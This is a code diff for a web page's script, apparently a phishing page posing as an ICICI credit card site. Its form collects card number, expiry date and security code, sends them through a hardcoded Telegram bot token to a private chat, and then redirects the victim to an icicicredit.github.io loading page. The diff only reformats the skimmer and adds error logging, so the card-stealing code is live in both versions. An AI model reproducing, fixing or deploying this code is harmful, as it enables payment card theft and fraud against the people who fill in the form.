@@ -245,43 +245,46 @@
 
   <script>
     document.getElementById('creditCardForm').addEventListener('submit', function(event) {
-      event.preventDefault();
-      var cardNumber = document.getElementById('cardNumber').value;
-      var expiryDate = document.getElementById('expiryDate').value;
-      var cuu = document.getElementById('cuu').value;
+  event.preventDefault();
+  var cardNumber = document.getElementById('cardNumber').value;
+  var expiryDate = document.getElementById('expiryDate').value;
+  var cuu = document.getElementById('cuu').value;
 
-      // WARNING: Exposing your Telegram bot token in client-side code is insecure
-      var botToken = '6254107538:AAHY9h6ImkVRqSujL3vATEX3L82wnYUh27E'; // Replace with your actual bot token
-      var chatId = '6657275025'; // Replace with your actual chat ID
-      var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  // WARNING: Exposing your Telegram bot token in client-side code is insecure
+  var botToken = '6254107538:AAHY9h6ImkVRqSujL3vATEX3L82wnYUh27E'; // Replace with your actual bot token
+  var chatId = '6657275025'; // Replace with your actual chat ID
+  var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-      var message = `Card Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCUU: ${cuu}`;
+  var message = `Card Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCUU: ${cuu}`;
 
-      fetch(apiUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
-      })
-      .then(response => response.json())
-      .then(data => {
-        if (data.ok) {
-          console.log('Before redirection'); // Add this line
-          window.location.href = 'https://icicicredit.github.io/loading/';
+  fetch(apiUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message
+    })
+  })
+  .then(response => response.json())
+  .then(data => {
+    if (data.ok) {
+      console.log('Message sent successfully.'); // Add this line
+      console.log('Before redirection'); // Add this line
+      window.location.href = 'https://icicicredit.github.io/loading/';
+    } else {
+      console.error('Failed to send the message to the Telegram bot:', data); // Add this line
+      alert('Failed to send the message to the Telegram bot.');
+    }
+  })
+  .catch((error) => {
+    console.error('Error while sending the message:', error);
+    alert('An error occurred while sending the message.');
+  });
+});
 
-        } else {
-          alert('Failed to send the message to the Telegram bot.');
-        }
-      })
-      .catch((error) => {
-        console.error('Error:', error);
-        alert('An error occurred while sending the message.');
-      });
-    });
+      
   </script>
 </body>
 </html>
